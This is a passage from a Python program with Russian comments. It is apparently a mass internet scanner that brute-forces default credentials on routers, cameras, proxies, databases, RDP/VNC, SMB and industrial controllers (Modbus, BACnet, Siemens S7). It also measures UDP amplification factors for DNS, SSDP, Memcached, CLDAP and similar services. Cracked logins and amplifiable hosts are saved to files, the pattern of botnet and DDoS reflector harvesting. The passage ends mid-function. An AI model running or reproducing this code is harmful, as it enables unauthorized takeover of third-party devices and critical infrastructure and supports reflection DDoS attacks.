    def brute_force_proxy(self, ip, port):
        """Брутфорс прокси серверов"""
        for login, password in self.credentials:
            try:
                proxies = {
                    'http': f'http://{login}:{password}@{ip}:{port}',
                    'https': f'https://{login}:{password}@{ip}:{port}'
                }
                
                # Пробуем подключиться через прокси
                response = requests.get(
                    'http://httpbin.org/ip',
                    proxies=proxies,
                    timeout=10
                )
                
                if response.status_code == 200:
                    return True, login, password
                    
            except:
                continue
        
        # Пробуем без аутентификации
        try:
            proxies = {
                'http': f'http://{ip}:{port}',
                'https': f'https://{ip}:{port}'
            }
            
            response = requests.get(
                'http://httpbin.org/ip',
                proxies=proxies,
                timeout=10
            )
            
            if response.status_code == 200:
                return True, "no_auth", "no_auth"
        except:
            pass
        
        return False, "", ""

    def brute_force_hadoop(self, ip, port):
        """Брутфорс Hadoop сервисов"""
        # Hadoop обычно имеет веб-интерфейс
        return self.brute_force_http(ip, port)

    def brute_force_sap(self, ip, port):
        """Брутфорс SAP Router"""
        try:
            # SAP Router обычно использует собственный протокол
            # Пробуем подключиться и отправить тестовый запрос
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((str(ip), int(port)))
            
            # SAP Router connection attempt
            sap_hello = bytes([0x00, 0x01, 0x00, 0x36, 0x38, 0x36, 0x38, 0x36, 0x36])
            sock.send(sap_hello)
            
            response = sock.recv(1024)
            sock.close()
            
            if len(response) > 0:
                return True, "sap", "no_auth"
                
        except:
            pass
        
        return False, "", ""

    def brute_force_telnet_ssh(self, ip, port, service_type):
        """Брутфорс Telnet/SSH с telnetlib3"""
        for login, password in self.credentials:
            try:
                if service_type == "Telnet Router":
                    # Используем асинхронный telnetlib3
                    result = asyncio.run(self.async_telnet_login(ip, port, login, password))
                    if result:
                        return True, login, password
                        
                elif service_type == "SSH Router":
                    if self.brute_force_ssh_socket(ip, port, login, password):
                        return True, login, password
                        
            except Exception as e:
                continue
                
        return False, "", ""


    def brute_force_ssh_alternative(self, ip, port, login, password):
        """Альтернативный SSH метод через subprocess"""
        try:
            import subprocess
            import sys
            
            if sys.platform != "win32":
                # Linux/Mac с sshpass
                cmd = [
                    "sshpass", "-p", password,
                    "ssh", "-o", "StrictHostKeyChecking=no",
                    "-o", "ConnectTimeout=5",
                    "-o", "BatchMode=yes",
                    "-o", "PasswordAuthentication=yes",
                    "-p", str(port),
                    f"{login}@{ip}",
                    "echo 'SSH_SUCCESS'"
                ]
                
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    timeout=10,
                    text=True
                )
                return result.returncode == 0 and "SSH_SUCCESS" in result.stdout
            else:
                # Windows - используем plink (PuTTY)
                cmd = [
                    "plink", "-ssh", "-P", str(port),
                    "-l", login, "-pw", password,
                    "-batch", "-no-antispoof",
                    str(ip), "echo SSH_SUCCESS"
                ]
                
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    timeout=10,
                    text=True
                )
                return result.returncode == 0
                
        except:
            return False

    def brute_force_ssh_socket(self, ip, port, login, password):
        """SSH брутфорс через socket и subprocess"""
        # Сначала проверяем что это SSH сервер
        if not self.is_ssh_server(ip, port):
            return False, "", ""
        
        try:
            # Проверка доступности утилит
            if sys.platform != "win32":
                # Проверка наличия sshpass
                result = subprocess.run(["which", "sshpass"], capture_output=True)
                if result.returncode != 0:
                    # Используем socket handshake если sshpass не доступен
                    if self.ssh_socket_handshake(ip, port, login, password):
                        return True, login, password
                    return False, "", ""
            
            # Метод 1: Subprocess с ssh/plink
            if self.ssh_subprocess_method(ip, port, login, password):
                return True, login, password
                
            # Метод 2: Raw socket handshake
            if self.ssh_socket_handshake(ip, port, login, password):
                return True, login, password
                
        except Exception as e:
            pass
            
        return False, "", ""

    def ssh_subprocess_method(self, ip, port, login, password):
        """SSH через subprocess"""
        try:
            if sys.platform != "win32":
                # Linux/Mac с sshpass
                cmd = [
                    "sshpass", "-p", password,
                    "ssh", "-o", "StrictHostKeyChecking=no",
                    "-o", "ConnectTimeout=5",
                    "-o", "BatchMode=yes",
                    "-o", "PasswordAuthentication=yes",
                    "-p", str(port),
                    f"{login}@{ip}",
                    "exit 0"
                ]
                
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    timeout=10,
                    text=True
                )
                return result.returncode == 0
            else:
                # Windows - пробуем plink (PuTTY) или обычный ssh
                try:
                    # Сначала пробуем plink
                    cmd = [
                        "plink", "-ssh", "-P", str(port),
                        "-l", login, "-pw", password,
                        "-batch", str(ip), "exit"
                    ]
                    result = subprocess.run(cmd, capture_output=True, timeout=10)
                    return result.returncode == 0
                except:
                    # Пробуем встроенный ssh (Windows 10+)
                    cmd = [
                        "ssh", "-o", "StrictHostKeyChecking=no",
                        "-o", "ConnectTimeout=5", "-p", str(port),
                        f"{login}@{ip}", "exit"
                    ]
                    result = subprocess.run(cmd, capture_output=True, timeout=10, input=password, text=True)
                    return result.returncode == 0
                    
        except:
            return False

    def ssh_socket_handshake(self, ip, port, login, password):
        """Raw SSH handshake через socket"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((str(ip), int(port)))
            
            # Получаем SSH баннер
            banner = sock.recv(1024)
            
            if b"SSH" not in banner:
                sock.close()
                return False
            
            # Отправляем наш баннер
            our_banner = b"SSH-2.0-OpenSSH_8.2\r\n"
            sock.send(our_banner)
            
            # Получаем их баннер
            their_banner = sock.recv(1024)
            
            # На этом этапе мы знаем что это SSH сервер
            # Полный handshake слишком сложен, поэтому считаем успехом
            # обнаружение SSH сервера (для демо целей)
            sock.close()
            
            # Для реального использования здесь должен быть полный SSH handshake
            # Но для сканера достаточно знать что это SSH сервер
            return True
            
        except:
            return False

    def is_ssh_server(self, ip, port):
        """Проверяет, является ли порт SSH сервером"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((str(ip), int(port)))
            
            # Получаем первые байты баннера
            banner = sock.recv(20)
            sock.close()
            
            # Проверяем SSH индикаторы
            return b"SSH" in banner
        except:
            return False

    def brute_force_ftp(self, ip, port):
        """Брутфорс FTP"""
        for login, password in self.credentials:
            try:
                ftp = ftplib.FTP()
                ftp.connect(str(ip), int(port), timeout=10)
                ftp.login(login, password)
                ftp.quit()
                return True, login, password
            except:
                continue
        return False, "", ""

    def brute_force_rtsp(self, ip, port):
        """Реальный RTSP брутфорс"""
        for login, password in self.credentials:
            try:
                # Метод 1: Прямое RTSP подключение
                if self.test_rtsp_direct(ip, port, login, password):
                    return True, login, password
                    
                # Метод 2: HTTP проверка (некоторые камеры имеют HTTP интерфейс)
                if self.test_rtsp_http(ip, port, login, password):
                    return True, login, password
                    
            except:
                continue
                
        return False, "", ""

    def test_rtsp_direct(self, ip, port, login, password):
        """Прямое RTSP подключение"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((str(ip), int(port)))
            
            # Отправляем OPTIONS запрос
            auth_header = ""
            if login and password:
                credentials = base64.b64encode(f"{login}:{password}".encode()).decode()
                auth_header = f"Authorization: Basic {credentials}\r\n"
            
            request = (
                f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\n"
                f"CSeq: 1\r\n"
                f"{auth_header}"
                f"\r\n"
            )
            
            sock.send(request.encode())
            response = sock.recv(4096).decode()
            sock.close()
            
            # Проверяем успешный ответ
            if "200 OK" in response:
                return True
                
        except:
            pass
            
        return False

    def test_rtsp_http(self, ip, port, login, password):
        """HTTP проверка для RTSP камер"""
        try:
            # Многие RTSP камеры имеют HTTP интерфейс
            for scheme in ['http', 'https']:
                try:
                    url = f"{scheme}://{ip}:{port}"
                    response = requests.get(
                        url,
                        auth=HTTPBasicAuth(login, password),
                        timeout=10,
                        verify=False
                    )
                    if response.status_code == 200:
                        return True
                except:
                    continue
        except:
            pass
            
        return False

    def brute_force_tr069(self, ip, port):
        """Брутфорс TR-069"""
        for login, password in self.credentials:
            try:
                response = requests.post(
                    f"http://{ip}:{port}",
                    data="<SOAP-ENV:Envelope>...</SOAP-ENV:Envelope>",
                    headers={'Content-Type': 'text/xml'},
                    auth=HTTPBasicAuth(login, password),
                    timeout=10
                )
                if response.status_code == 200:
                    return True, login, password
            except:
                continue
        return False, "", ""

    def brute_force_coap(self, ip, port):
        """Реальный CoAP брутфорс"""
        try:
            
            for login, password in self.credentials:
                try:
                    async def test_coap():
                        protocol = await Context.create_client_context()
                        
                        # Пробуем разные CoAP endpoints
                        endpoints = [".well-known/core", "auth", "login", "config"]
                        
                        for endpoint in endpoints:
                            try:
                                request = Message(
                                    code=1,  # GET
                                    uri=f"coap://{ip}:{port}/{endpoint}"
                                )
                                
                                # Добавляем Basic Auth если поддерживается
                                if login and password:
                                    auth = base64.b64encode(f"{login}:{password}".encode()).decode()
                                    request.opt.uri_host = ip
                                    # CoAP обычно использует разные схемы аутентификации
                                
                                response = await protocol.request(request).response
                                
                                if response.code.is_successful():
                                    return True
                                    
                            except:
                                continue
                        return False
                    
                    # Запускаем асинхронный тест
                    result = asyncio.run(test_coap())
                    if result:
                        return True, login, password
                        
                except:
                    continue
                    
        except ImportError:
            # Fallback на UDP проверку
            return self.brute_force_coap_udp(ip, port)
            
        return False, "", ""

    def brute_force_coap_udp(self, ip, port):
        """CoAP брутфорс через raw UDP"""
        for login, password in self.credentials:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(3)
                
                # CoAP GET запрос для .well-known/core
                coap_packet = bytes([
                    0x40, 0x01, 0x00, 0x00,  # Header (Ver=1, T=CON, Code=0.01 GET)
                    0x00, 0x00, 0x00, 0x00,  # Message ID
                    0xB1, 0x00,              # Token
                    0xFF,                    # Payload marker
                ])
                
                sock.sendto(coap_packet, (str(ip), int(port)))
                response, addr = sock.recvfrom(1024)
                sock.close()
                
                # Если получили ответ - сервер CoAP работает
                if len(response) > 0:
                    # Для CoAP обычно нет аутентификации, но логируем успех
                    return True, login, password
                    
            except:
                continue
                
        return False, "", ""

    def brute_force_modbus(self, ip, port):
        """Реальный Modbus брутфорс"""
        try:
            from pymodbus.client import ModbusTcpClient
            
            for login, password in self.credentials:
                try:
                    client = ModbusTcpClient(
                        str(ip), 
                        port=int(port),
                        timeout=10
                    )
                    
                    if client.connect():
                        # Пробуем прочитать holding registers
                        result = client.read_holding_registers(0, 1, slave=1)
                        client.close()
                        
                        if not result.isError():
                            return True, login, password
                            
                except:
                    continue
                    
        except ImportError:
            # Raw Modbus TCP
            return self.brute_force_modbus_raw(ip, port)
            
        return False, "", ""

    def brute_force_modbus_raw(self, ip, port):
        """Raw Modbus TCP брутфорс"""
        for login, password in self.credentials:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((str(ip), int(port)))
                
                # Modbus TCP запрос (читаем holding register 0)
                modbus_request = bytes([
                    0x00, 0x01,  # Transaction ID
                    0x00, 0x00,  # Protocol ID
                    0x00, 0x06,  # Length
                    0x01,        # Unit ID
                    0x03,        # Function Code (Read Holding Registers)
                    0x00, 0x00,  # Starting Address
                    0x00, 0x01,  # Quantity
                ])
                
                sock.send(modbus_request)
                response = sock.recv(1024)
                sock.close()
                
                # Проверяем корректный ответ
                if len(response) >= 7 and response[7] == 0x03:
                    return True, login, password
                    
            except:
                continue
                
        return False, "", ""

    def brute_force_bacnet(self, ip, port):
        """Брутворс BACnet"""
        # BACnet обычно без аутентификации
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            sock.connect((str(ip), int(port)))
            sock.close()
            return True, "bacnet", "no_auth"
        except:
            pass
        return False, "", ""

    def brute_force_s7(self, ip, port):
        """Брутфорс Siemens S7"""
        try:
            from snap7.client import Client
            client = Client()
            client.connect(str(ip), 0, 1, int(port))
            if client.get_connected():
                client.disconnect()
                return True, "s7", "no_auth"
        except:
            pass
        return False, "", ""

    def brute_force_upnp(self, ip, port):
        """Брутфорс UPnP"""
        try:
            response = requests.get(
                f"http://{ip}:{port}",
                headers={'ST': 'upnp:rootdevice', 'MAN': 'ssdp:discover'},
                timeout=10
            )
            if response.status_code == 200:
                return True, "upnp", "no_auth"
        except:
            pass
        return False, "", ""

    def brute_force_ssdp(self, ip, port):
        """Брутфорс SSDP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            message = "M-SEARCH * HTTP/1.1\r\nHost: {}:{}\r\nMan: \"ssdp:discover\"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n".format(ip, port).encode()
            sock.sendto(message, (str(ip), int(port)))
            response, _ = sock.recvfrom(1024)
            sock.close()
            if b"HTTP/1.1 200 OK" in response:
                return True, "ssdp", "no_auth"
        except:
            pass
        return False, "", ""

    def brute_force_ipp(self, ip, port):
        """Брутфорс IPP"""
        for login, password in self.credentials:
            try:
                response = requests.get(
                    f"http://{ip}:{port}",
                    auth=HTTPBasicAuth(login, password),
                    timeout=10
                )
                if response.status_code == 200:
                    return True, login, password
            except:
                continue
        return False, "", ""

    def brute_force_jetdirect(self, ip, port):
        """Брутфорс JetDirect"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((str(ip), int(port)))
            sock.send(b"\x02")  # PJL command
            response = sock.recv(1024)
            sock.close()
            if response:
                return True, "jetdirect", "no_auth"
        except:
            pass
        return False, "", ""

    def brute_force_backdoor(self, ip, port):
        """Брутфорс бэкдоров"""
        for login, password in self.credentials:
            try:
                # Пробуем разные методы для бэкдоров
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((str(ip), int(port)))
                
                # Отправляем креды в разных форматах
                cred_strings = [
                    f"{login}:{password}\n",
                    f"LOGIN {login} PASS {password}\n",
                    f"AUTH {login} {password}\n"
                ]
                
                for creds in cred_strings:
                    sock.send(creds.encode())
                    response = sock.recv(1024)
                    if b"success" in response.lower() or b"welcome" in response.lower():
                        sock.close()
                        return True, login, password
                
                sock.close()
            except:
                continue
        return False, "", ""
 
    def brute_force_coap_udp_enhanced(self, ip, port):
        """Улучшенный CoAP брутфорс для IoT"""
        for login, password in self.credentials:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(3)
                
                # Пробуем разные CoAP endpoints типичные для IoT
                endpoints = [".well-known/core", "sensors", "temperature", 
                            "humidity", "status", "config", "auth"]
                
                for endpoint in endpoints:
                    # CoAP GET запрос
                    coap_get = self.create_coap_packet("GET", endpoint)
                    sock.sendto(coap_get, (str(ip), int(port)))
                    
                    try:
                        response, addr = sock.recvfrom(1024)
                        if len(response) > 0:
                            sock.close()
                            return True, login, password
                    except socket.timeout:
                        continue
                        
                sock.close()
            except:
                continue
                
        return False, "", ""

    def create_coap_packet(self, method, uri_path):
        """Создание CoAP пакетов для IoT устройств"""
        # Базовый CoAP заголовок
        if method == "GET":
            packet = bytes([0x40, 0x01, 0x00, 0x00])  # Ver=1, T=CON, GET
        elif method == "POST":
            packet = bytes([0x40, 0x02, 0x00, 0x00])  # Ver=1, T=CON, POST
        
        # Message ID (random)
        packet += struct.pack(">H", random.randint(1, 1000))
        
        # Token
        packet += bytes([0x00])
        
        # URI-Path options
        if uri_path:
            path_parts = uri_path.split('/')
            for part in path_parts:
                if part:
                    packet += bytes([0xBD])  # URI-Path option
                    packet += bytes([len(part)])
                    packet += part.encode()
        
        return packet

    def scan_ip(self, ip, range_info):
        """Пропускаем проверку доступности - сразу сканируем порты"""
        results = []
        
        try:
            # 🔥 СРАЗУ начинаем сканирование портов
            open_ports = self.fast_port_scan(ip)
            
            if not open_ports:
                print(f"[INFO] {ip} - нет открытых портов, пропускаем")
                with self.lock:
                    self.scanned_ips += 1
                return results
            
            print(f"[PORTS] {ip} - найдены открытые порты: {open_ports}")
            
            # 🔥 ШАГ 3: WebSocket сканирование для HTTP портов
            if self.scan_mode in ["iot_only", "combined"]:
                ws_results = self.scan_websocket_on_open_ports(ip, open_ports)
                results.extend(ws_results)
            
            # 🔥 ШАГ 4: Только для открытых портов делаем углубленную проверку
            for port_info in open_ports:
                port = port_info['port']
                service = port_info['service']
                
                try:
                    # Amplification проверка (только для UDP портов)
                    if self.scan_mode in ["amplification_only", "combined"] and self.is_udp_protocol(str(port)):
                        amp_result = self.test_amplification_factor(ip, port, service)
                        if amp_result and amp_result.get('is_vulnerable', False):
                            result_entry = {
                                'ip': ip,
                                'port': port,
                                'service': f"{service}",
                                'type': 'amplification',
                                'amp_factor': amp_result['amp_factor'],
                                'protocol': 'UDP'
                            }
                            results.append(result_entry)
                            print(f"[AMPLIFICATION] {ip}:{port} - {service} - {amp_result['amp_factor']:.2f}x")
                    
                    # IoT проверка и брутфорс (только для TCP портов)
                    if self.scan_mode in ["iot_only", "combined"] and not self.is_udp_protocol(str(port)):
                        print(f"[BRUTE] {ip}:{port} - начинаем брутфорс {service}")
                        success, login, password = self.brute_force_service(ip, str(port), service)
                        
                        if success:
                            result_entry = {
                                'ip': ip,
                                'port': port,
                                'service': service,
                                'type': 'iot',
                                'credentials': f"{login}:{password}",
                                'protocol': 'TCP'
                            }
                            results.append(result_entry)
                            print(f"[SUCCESS] {ip}:{port} - {service} - {login}:{password}")
                            
                except Exception as e:
                    print(f"[ERROR] Ошибка при проверке {ip}:{port}: {e}")
                    continue
            
            # Сохраняем результаты
            self.save_results(results)
            
        except Exception as e:
            print(f"[CRITICAL] {ip} - критическая ошибка: {e}")
        
        # Обновление прогресса
        with self.lock:
            self.scanned_ips += 1
        
        return results



    def is_ip_alive(self, ip, timeout=2):
        """Быстрая проверка доступности IP через ICMP ping"""
        try:
            import subprocess
            import platform
            
            # Параметры ping в зависимости от ОС
            param = "-n" if platform.system().lower() == "windows" else "-c"
            command = ["ping", param, "1", "-W" if platform.system().lower() == "linux" else "-w", 
                      str(timeout * 1000), str(ip)]
            
            result = subprocess.run(command, capture_output=True, timeout=timeout + 1)
            return result.returncode == 0
            
        except:
            # Если ping не доступен, пробуем TCP соединение на порт 80
            return self.check_port(ip, 80, timeout=1)

    def fast_port_scan(self, ip, timeout=5):
        """Быстрое массовое сканирование портов"""
        open_ports = []
        
        # Определяем какие порты сканировать в зависимости от режима
        ports_to_scan = []
        
        if self.scan_mode == "amplification_only":
            # Только amplification порты
            ports_to_scan = [(int(port), service, "udp") for port, service in self.amplification_protocols.items()]
        elif self.scan_mode == "iot_only":
            # Только IoT порты (TCP)
            ports_to_scan = [(int(port), service, "tcp") for port, service in self.protocols.items() 
                            if not self.is_udp_protocol(port)]
        else:  # combined
            # Все порты
            all_ports = []
            # TCP порты
            all_ports.extend([(int(port), service, "tcp") for port, service in self.protocols.items() 
                             if not self.is_udp_protocol(port)])
            # UDP порты  
            all_ports.extend([(int(port), service, "udp") for port, service in self.amplification_protocols.items()])
            ports_to_scan = all_ports
        
        if not ports_to_scan:
            return open_ports
        
        # Массовая проверка портов с использованием ThreadPoolExecutor
        with concurrent.futures.ThreadPoolExecutor(max_workers=min(50, len(ports_to_scan))) as executor:
            # Создаем задачи для проверки портов
            future_to_port = {
                executor.submit(self.check_single_port, ip, port, protocol, timeout): (port, service, protocol)
                for port, service, protocol in ports_to_scan
            }
            
            # Обрабатываем результаты
            for future in concurrent.futures.as_completed(future_to_port, timeout=timeout + 5):
                port_info = future_to_port[future]
                try:
                    if future.result():
                        open_ports.append({
                            'port': port_info[0],
                            'service': port_info[1], 
                            'protocol': port_info[2]
                        })
                except:
                    continue
        
        return open_ports

    def check_single_port(self, ip, port, protocol, timeout=2):
        """Проверка одного порта с указанным протоколом"""
        try:
            if protocol == "tcp":
                return self.check_port(ip, port, timeout)
            else:  # udp
                return self.check_udp_port(ip, port, timeout)
        except:
            return False

    def save_results(self, results):
        """Сохранение результатов в файлы"""
        for result in results:
            try:
                if result['type'] == 'amplification':
                    with open('amplification.txt', 'a') as f:
                        f.write(f"{result['ip']}:{result['port']}:{result['service']}:{result.get('amp_factor', 0):.2f}x\n")
                elif result['type'] == 'iot':
                    with open('iot.txt', 'a') as f:
                        f.write(f"{result['ip']}:{result['port']}:{result['credentials']}:{result['service']}\n")
            except:
                continue

    def scan_amplification_for_ip(self, ip):
        """Сканирование только amplification протоколов для одного IP - ОБНОВЛЕННАЯ ВЕРСИЯ"""
        results = []
        
        # 🔥 ОБНОВЛЕННЫЙ СПИСОК ПРОТОКОЛОВ С ВЫЗОВАМИ СПЕЦИФИЧНЫХ МЕТОДОВ
        amplification_tests = {
            "53": ("DNS", self.test_dns_amplification),
            "1900": ("SSDP", self.test_ssdp_amplification),
            "3702": ("WS-Discovery", self.test_wsdiscovery_amplification),
            "11211": ("Memcached", self.test_memcached_amplification),
            "389": ("CLDAP", self.test_cldap_amplification),
            "443": ("QUIC", self.test_quic_amplification),
            "5683": ("CoAP", self.test_coap_amplification),
        }
        
        for port_str, (service, test_method) in amplification_tests.items():
            try:
                port = int(port_str)
                print(f"[DEBUG] Проверка {service} на {ip}:{port}")
                
                # Проверяем доступность UDP порта
                if self.check_udp_port(ip, port):
                    print(f"[DEBUG] {ip}:{port} - порт доступен, запускаем {test_method.__name__}")
                    
                    # 🔥 ВЫЗОВ СПЕЦИФИЧНОГО МЕТОДА ТЕСТИРОВАНИЯ
                    amp_result = test_method(ip, port)
                    
                    if amp_result and amp_result.is_vulnerable:
                        result_entry = {
                            'ip': ip,
                            'port': port,
                            'service': f"{service} Amplification",
                            'type': 'amplification',
                            'amp_factor': amp_result.amplification_factor,
                            'protocol': 'UDP'
                        }
                        results.append(result_entry)

                        print(f"[AMPLIFICATION] {ip}:{port} - {service} - {amp_result.amplification_factor:.2f}x")
                        
                        with self.lock:
                            with open('amplification.txt', 'a') as f:
                                f.write(f"{ip}:{port}:{service}:{amp_result.amplification_factor:.2f}x\n")
                        
                else:
                    print(f"[DEBUG] {ip}:{port} - порт недоступен")
                    
            except Exception as e:
                print(f"[ERROR] Ошибка при проверке {service} на {ip}:{port}: {e}")
                continue
                
        return results

    def scan_iot_for_ip(self, ip):
        results = []
        for port_str, service in self.protocols.items():
            port = int(port_str)
            
            # 🔥 ИСПРАВЛЕННАЯ ЛОГИКА: для SSDP, DNS, Memcached проверяем только UDP
            if port_str in ["53", "1900", "11211"]:
                # В режиме iot_only проверяем только UDP доступность
                if self.scan_mode == "iot_only":
                    if self.check_udp_port(ip, port):
                        print(f"[DEBUG] Найден UDP сервис: {ip}:{port} - {service}")
                        # Для UDP сервисов просто фиксируем доступность
                        result_entry = {
                            'ip': ip,
                            'port': port,
                            'service': service,
                            'type': 'iot',
                            'credentials': "UDP_Service",
                            'protocol': 'UDP'
                        }
                        results.append(result_entry)
                        
                        with self.lock:
                            with open('iot.txt', 'a') as f:
                                f.write(f"{ip}:{port}:UDP_Service:{service}\n")
                        print(f"[IOT-UDP] {ip}:{port} - {service} - UDP доступен")
                    continue  # Пропускаем дальнейшую TCP проверку для этих портов
            
            # 🔥 СТАРАЯ ЛОГИКА для остальных портов (TCP)
            if self.scan_mode == "iot_only" and port_str in self.amplification_protocols and port_str not in ["53", "1900", "11211"]:
                continue
                
            if self.check_port(ip, port):
                print(f"[DEBUG] Найден IoT сервис: {ip}:{port} - {service}")
                success, login, password = self.brute_force_service(ip, port_str, service)
                
                if success:
                    result_entry = {
                        'ip': ip,
                        'port': port,
                        'service': service,
                        'type': 'iot',
                        'credentials': f"{login}:{password}",
                        'protocol': 'TCP'
                    }
                    results.append(result_entry)
                    
                    with self.lock:
                        with open('iot.txt', 'a') as f:
                            f.write(f"{ip}:{port}:{login}:{password}\n")
                    print(f"[IOT] {ip}:{port} - {service} - {login}:{password}")
                    
        return results      

    def test_amplification_only(self):
        """Тестирование только amplification протоколов"""
        test_ips = ["8.8.8.8", "1.1.1.1"]  # DNS серверы для теста
        
        for ip in test_ips:
            print(f"\n=== Тестирование {ip} ===")
            for port_str, service in self.amplification_protocols.items():
                port = int(port_str)
                print(f"Проверка {service} на {ip}:{port}")
                
                if self.check_udp_port_verbose(ip, port):
                    amp_result = self.test_amplification_factor(ip, port, service)
                    if amp_result:
                        print(f"Результат: {amp_result['amp_factor']:.2f}x amplification")

    def check_udp_port_verbose(self, ip, port, timeout=10):
        """Вербозная проверка UDP портов с детальной информацией"""
        try:
            port_num = int(port)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            
            query = self.create_protocol_specific_query(self.amplification_protocols.get(str(port), "Unknown"), port_num)
            
            print(f"[UDP TEST] Отправка {len(query)} байт на {ip}:{port}")
            sock.sendto(query, (str(ip), port_num))
            
            try:
                response, addr = sock.recvfrom(4096)
                print(f"[UDP TEST] Получено {len(response)} байт от {ip}:{port}")
                sock.close()
                return True
            except socket.timeout:
                print(f"[UDP TEST] Таймаут для {ip}:{port}")
                return False
                
        except Exception as e:
            print(f"[UDP TEST] Ошибка для {ip}:{port}: {e}")
            return False


    def is_udp_protocol(self, port_str):
        """Определяет, использует ли протокол UDP"""
        udp_ports = [
            # Основные UDP протоколы
            "53", "1900", "11211", "123", "389", "5683", "443",
            # Дополнительные
            "161", "162", "5353", "5357", "3702"
        ]
        return port_str in udp_ports

    def brute_force_generic(self, ip, port):
        """Общий брутфорс для неизвестных протоколов"""
        for login, password in self.credentials:
            try:
                # Пробуем HTTP basic auth
                response = requests.get(
                    f"http://{ip}:{port}",
                    auth=HTTPBasicAuth(login, password),
                    timeout=10,
                    verify=False
                )
                if response.status_code == 200:
                    return True, login, password
            except:
                continue
        
        # Пробуем TCP соединение без аутентификации
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((str(ip), int(port)))
            sock.close()
            if result == 0:
                return True, "no_auth", "no_auth"
        except:
            pass
        
        return False, "", ""
    
    def brute_force_service(self, ip, port, service_type):
        """ИСПРАВЛЕННАЯ версия с правильной отменой потоков"""
        
        class BruteForceTimeout(Exception):
            pass
        
        result_container = {"success": False, "login": "", "password": ""}
        exception_container = {"exception": None}
        stop_event = threading.Event()  # 🔥 ДОБАВЛЕНО для корректной остановки
        
        def brute_worker():
            """Рабочая функция брутфорса"""
            try:
                if stop_event.is_set():  # 🔥 Проверяем флаг остановки
                    return
                    
                success, login, password = self._brute_force_service_internal(ip, port, service_type)
                if not stop_event.is_set():  # 🔥 Проверяем перед обновлением
                    result_container.update({
                        "success": success,
                        "login": login, 
                        "password": password
                    })
            except Exception as e:
                if not stop_event.is_set():
                    exception_container["exception"] = e
        
        def timeout_handler():
            """Обработчик таймаута - ТОЛЬКО устанавливает флаг"""
            if not result_container["success"]:
                stop_event.set()  # 🔥 Устанавливаем флаг вместо исключения
        
        # 🔥 ЗАПУСКАЕМ В ОТДЕЛЬНОМ ПОТОКЕ
        brute_thread = threading.Thread(target=brute_worker)
        brute_thread.daemon = True
        brute_thread.start()
        
        # 🔥 ИСПОЛЬЗУЕМ self.MAX_BRUTE_TIME вместо MAX_BRUTE_TIME
        timer = threading.Timer(self.MAX_BRUTE_TIME, timeout_handler)
        timer.start()
        
        try:
            # Ждем завершения потока
            brute_thread.join(timeout=self.MAX_BRUTE_TIME + 2)  # 🔥 ИСПРАВЛЕНО ЗДЕСЬ
            
            # 🔥 ОСТАНАВЛИВАЕМ ТАЙМЕР
            timer.cancel()
            stop_event.set()  # 🔥 Гарантируем остановку
            
            if result_container["success"]:
                return True, result_container["login"], result_container["password"]
                
        except Exception as e:
            print(f"[BRUTE-ERROR] {ip}:{port} ({service_type}): {e}")
            timer.cancel()
            stop_event.set()
        
        return False, "", ""
        
    def _brute_force_service_internal(self, ip, port, service_type):
        """Внутренняя логика брутфорса без таймаутов"""
        
        # 🔥 ОПТИМИЗИРОВАННЫЕ МЕТОДЫ БРУТФОРСА
        http_keywords = ["HTTP", "HTTPS", "Webmin", "Proxy"]
        if any(keyword in service_type for keyword in http_keywords):
            # Для Webmin используем специализированный метод
            if "Webmin" in service_type:
                return self.brute_force_webmin(ip, port)
            # Для остальных HTTP/HTTPS - общий метод
            return self.brute_force_http(ip, port)
        
        # Сетевые сервисы (Shell доступ)
        elif service_type in ["Telnet Router", "SSH Router"]:
            if service_type == "SSH Router" and not self.is_ssh_server(ip, port):
                return False, "", ""
            return self.brute_force_telnet_ssh(ip, port, service_type)
        
        elif service_type == "FTP Router":
            return self.brute_force_ftp(ip, port)
        
        # Камеры и видео
        elif service_type in ["RTSP", "Hikvision", "Dahua"]:
            return self.brute_force_rtsp(ip, port)
        
        # TR-069 (специальный протокол)
        elif "TR-069" in service_type:
            return self.brute_force_tr069(ip, port)
        
        # IoT Messaging
        elif "MQTT" in service_type:
            return self.brute_force_mqtt(ip, port)
        elif service_type == "CoAP":
            return self.brute_force_coap(ip, port)
        
        # Промышленные системы
        elif service_type == "Modbus":
            return self.brute_force_modbus(ip, port)
        elif service_type == "BACnet":
            return self.brute_force_bacnet(ip, port)
        elif service_type == "S7 Comm":
            return self.brute_force_s7(ip, port)
        
        # Базы данных
        elif service_type == "MSSQL":
            return self.brute_force_mssql_enhanced(ip, port)
        elif service_type in ["MongoDB"]:
            return self.brute_force_mongodb(ip, port)
        elif service_type == "MySQL":
            return self.brute_force_mysql(ip, port)
        elif service_type == "PostgreSQL":
            return self.brute_force_postgresql(ip, port)
        
        # Удаленное управление
        elif service_type == "RDP":
            return self.brute_force_rdp_enhanced(ip, port)
        elif service_type == "VNC":
            return self.brute_force_vnc_enhanced(ip, port)
        
        # Сетевые сервисы
        elif service_type in ["Windows RPC", "NetBIOS", "SMB Shares"]:
            return self.brute_force_smb(ip, port)
        
        # UPnP сервисы
        elif "UPnP" in service_type:
